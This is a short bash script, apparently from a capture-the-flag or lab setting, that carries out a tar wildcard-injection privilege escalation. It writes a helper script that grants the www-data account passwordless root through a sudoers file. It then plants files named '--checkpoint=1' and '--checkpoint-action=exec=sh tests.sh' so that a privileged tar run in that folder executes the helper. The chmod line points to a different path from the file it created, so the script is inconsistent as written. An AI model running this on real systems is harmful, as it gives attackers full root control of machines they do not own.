#!/bin/bash
cd /tmp/backups
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers.d/www-data' > tests.sh
chmod +x /tmp/tests.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh tests.sh'